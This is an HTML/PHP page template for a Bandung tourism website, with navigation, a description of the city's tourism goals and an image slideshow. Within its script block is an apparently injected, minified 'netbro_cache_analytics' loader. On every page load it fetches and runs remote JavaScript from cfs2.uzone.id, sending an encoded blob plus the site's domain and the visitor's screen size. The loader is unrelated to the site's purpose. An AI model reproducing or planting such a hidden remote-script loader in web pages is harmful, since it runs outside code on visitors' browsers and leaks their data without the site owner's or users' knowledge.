<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Objek Wisata Bandung</title>
	<link href="https://fonts.googleapis.com/css?family=Sacramento|Tangerine" rel="stylesheet">
	<link href="<?php echo base_url(); ?>css/Navbar.css" rel="stylesheet">  
	<link href="<?php echo base_url(); ?>css/Home.css" rel="stylesheet">  
</head>

<body  background="<?php echo base_url(); ?>Gambar/cloud.jpg">
 <div class="navbar">
  <nav>
    <ul>
      <li><a href="home">Home</a></li>
      <li><a href="view">View</a></li>
      <li><a href=#>List</a>
        <ul>
          <li><a href="lst">Wisata Budaya</a></li>
          <li><a href="lts">Wisata Alam</a></li>
        </ul>
      </li>
      <li><a href="about">About Us</a></li>
      <a href="https://facebook.com/"><img src="<?php echo base_url(); ?>Gambar\facebook.png" width=2.5%></a>
      <a href="https://twitter.com/"><img src="<?php echo base_url(); ?>Gambar\twitter2.png" width=2.5%></a>
      <a href="https://instagram.com/"><img src="<?php echo base_url(); ?>Gambar\instagram1.png" width=2.5%></a>
    </ul>
  </nav>
</div>
<div class="badan">			
	<div class="sidebar">
		<img src="<?php echo base_url(); ?>Gambar\Bandung.png" style="width:20%">
		<h1>Pariwisata Kota Bandung</h1>
		<p>Mengembangkan Sumber Daya Manusia dan Kelembagaan Kepariwisataan yang profesional, berkarakteristik sunda dan berwawasan global;<br>Meningkatkan pelestarian, pemberdayaan pengembangan  dan pemanfaatan kebudayaan dan kesenian;
		<br>Meningkatkan destinasi pariwisata kota yang berdaya saing tinggi baik pada tingkat regional nasional maupun internasional;</p>
		<a href="login" class="button">Visit Now</a>
	</div>
	<div class="content">
		<div class="mySlides fade">
			<img src="<?php echo base_url(); ?>Gambar\DusunBambu.jpg" style="width:100%">
		</div>

		<div class="mySlides fade">
			<img src="<?php echo base_url(); ?>Gambar\GedungSate.jpg" style="width:100%">
		</div>
		
		<div class="mySlides fade">
			<img src="<?php echo base_url(); ?>Gambar\RancaUpas.jpg" style="width:100%">
		</div>
		<a class="prev" onclick="plusSlides(-1)">&#10094;</a>
		<a class="next" onclick="plusSlides(1)">&#10095;</a>
	</div>
</div>
<script type="text/javascript">
    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnwugHnQ%2f%2f1W3q%2bQURlegSOlN%2bWmuLWmq4RWjglhX8SfJE8uAe0tvEgc5wtVtBKq92rg6Lzggx6ZVYZEaHTgKrQpxf0%2fG%2bVF6%2bbbABfAsFvvTO0Dotdeqws%2fxgXKZaIob3k8F0YWKh%2biSNY60wRPyBbDchNzl5281IWR0OO7SnCmRNUksFN9%2fTmdwfqFyer3Rnsse%2fS7%2fccTFtU8FbJKDVw9KyAvf8m%2fqEyp93EJm5rTKzlp8Pc5oIW%2fF8l6%2bGItIpsj4W3d8800xdRjFI2ClWOfQh5YlVPWU1p1FqlVsl6fz6uQvggrC1JCPt1H4JFUnIiPVKIVNMv63hX%2bhO5jfb8hdAdY0EAWtpPhQnKSPZuPVJs0Va6BRRUCGUpIiLNt7%2f6BaZBVp1IgwWMVsOb7ftIpLKCcwfV%2fB8xzwzMOnHvreXtadssaImYcu3gNwhQiUdQCtwD5WddcR%2f0dhQQLoRQ5oZ%2bD9Jjo9%2bJ%2fFAraK%2bL6EMq50ghZlccKCrgb0bH6mPqbx5CDilWVnABlL56TL%2bKpCQCW3l9b7k13eAFeugHaK95ehGeW21m%2fyOvB6Fqeh9" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
    
    var slideIndex = 1;
    showSlides(slideIndex);

    function plusSlides(n) {
      showSlides(slideIndex += n);
    }

    function currentSlide(n) {
      showSlides(slideIndex = n);
    }
    var slideIndex = 0;
    showSlides();

    function showSlides() {
        var i;
        var slides = document.getElementsByClassName("mySlides");
        for (i = 0; i < slides.length; i++) {
            slides[i].style.display = "none"; 
        }
        slideIndex++;
        if (slideIndex> slides.length) {slideIndex = 1} 
        slides[slideIndex-1].style.display = "block"; 
        setTimeout(showSlides, 5000); // Change image every 2 seconds
    }
    function openNav() {
        document.getElementById("mySidenav").style.width = "250px";
        document.getElementById("main").style.marginLeft = "250px";
    }

    function closeNav() {
        document.getElementById("mySidenav").style.width = "0";
        document.getElementById("main").style.marginLeft= "0";
    }
    function myFunction() {
        var popup = document.getElementById('myPopup');
        popup.classList.toggle('show');
    }    
</script>
	
</body>
</html>